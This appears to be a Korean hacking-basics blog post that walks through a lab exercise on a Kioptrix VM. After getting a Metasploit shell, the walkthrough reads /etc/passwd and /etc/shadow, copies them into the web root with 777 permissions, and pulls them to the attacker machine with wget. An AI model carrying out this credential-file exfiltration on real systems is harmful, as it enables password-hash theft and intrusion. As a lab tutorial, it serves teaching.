---
layout: post
title: '[해킹 기초] 14. Post-Exploit(후속 공격)'
date: '2023-01-09 10:59:10 +0900'
description: 'Post-Exploit(후속 공격)'
categories: [HACKING,HACKING - Part.2]
image: /assets/img/1/hacking.png
tags: [hacking]
toc: false
---
<a text-size="1px" target="_blank" href="https://icons8.com/icon/5503/hacking">Hacking</a> icon by <a target="_blank" href="https://icons8.com">Icons8</a>

우리는 이전 게시글까지 공격을 통해 피해자 PC shell을 획득하는 방법을 배웠다. 이제는 쉘을 획득한 다음 해야할 과정으로 Post-Exploit(후속 공격)을 알아볼 것이다.

### <b>■ Post-Exploit(후속 공격)이란?</b>
: 세션이 오픈된 후 일어나는 모든 행동을 일컫는다.

→ exploit을 하고 난 후 정보를 계속해서 모으는 것은 매우 중요하다. 이런 정보들이 다른 시스템을 공격할 때 도움을 줄 수도 있기 때문이다.

시스템을 해킹하고 난 후 해야하는 행동
1. Persistence ( 시스템에 지속적인 접근 유지)
2. Username과 Password Hashes 를 모은다
3. Password Cracking
4. 중요한 data 수집

따라서 exploit에 성공한 system에 지속적인 접근을 유지하는 것은 매우 중요하다.<br>
>출처:
Wikidocs

### <b>■ Post-Exploit(후속 공격)공격 : data 탈취 실습</b>
- [실습 환경]
    - Virtual Box(Kali Linux) - 공격자
    - Kioprix_Level 1 - 공격대상

- [공격 기법 참고 게시글]
    - [[해킹 기초] 13. 13. 메타스플로잇(Metasploit)](https://jjuseok.github.io/posts/hacking_part2-7/)

- [공격 순서]
    1. 피해자 PC(Kioprix_Level 1) shell 획득 <a href="https://jjuseok.github.io/posts/hacking_part1-4/">👉 13. 메타스플로잇(Metasploit)</a>
    2. 중요 data (/etc/shadow, /etc/passwd 등...) 확보.
    3. 중요 data 탈취 (피해자 PC -> 공격자 PC 중요 data 이동)

- [공격 목표]
    - Shell 획득 후 중요 data 탈취

<hr>
<img src="/assets/img/hacking/part2-8/1.png" alt="표사진"><br>
이전 게시글에서 했던 방식과 동일하게 메타스플로잇(Metasploit)을 이용해 피해자 PC 컴퓨터의 shell을 획득한다. shell을 획득하면 이제 아무 명령어를 내릴 수 있다.
여기서 우리의 목표인 중요 data를 확인하는 것이다. 중요 data 2개를 예로 들면 /etc/passwd(계정 정보), /etc/shadow(계정 PW) 파일이 있다. 중요 data 파일을 cat 명령어로 확인한 확보를 하자.
<hr>
<img src="/assets/img/hacking/part2-8/2.png" alt="표사진"><br>
중요 data를 wget을 통해 공격자 PC로 옮길 것이다. wget을 사용하기 위해서 80번 port(http)가 열려 있어야 된다. netstat -nat 명령어를 통해 80번 포트가 열려있는지 확인하자. 위 그림과 같이 열려있으면 된다.
<hr>
<img src="/assets/img/hacking/part2-8/3.png" alt="표사진"><br>
80번 port가 open 된 것을 확인 했으면 중요 data(/etc/passwd(계정 정보), /etc/shadow(계정 PW) 파일)를 /var/www/html로 복사하자. 복사하고 권한을 확인해보면 shadow 파일은 other 권한 자체가 없는 것을 확인할 수 있다. 우리는 root 권한을 갖고 있기 때문에 두개 파일 모두 777로 바꿔주자. ls -al로 확인 해보면 위와 같이 잘 바꿘 것을 확인할 수 있다.
<hr>
<img src="/assets/img/hacking/part2-8/4.png" alt="표사진"><br>
다른 cmd 창을 열어서 root 밑에 hacking 이라는 폴더를 만들자. 이 폴더 안에 두개의 파일을 가져올 것이다. hacking 폴더를 만들었으면 그 경로로 이동한다. 이동한 다음 hacking 폴더 안을 ls 명령어로 살펴보면 아무것도 없는 것을 확인할 수 있다. 여기서 wget 명령어를 통해 두개의 파일을 가져올 것이다.<br>
wget http://[공격 대상 IP]/[가져올 파일명]을 입력하면 파일을 가져올 수 있다. wget으로 두개 파일 모두 가져온 다음 ls로 확인해 보면 위와 같이 passwd, shadow 파일을 가져온 것을 확인할 수 있다. 이렇게 해서 중요 data 파일을 가져오는 방법을 알아봤다!!!!!!!!!
<hr>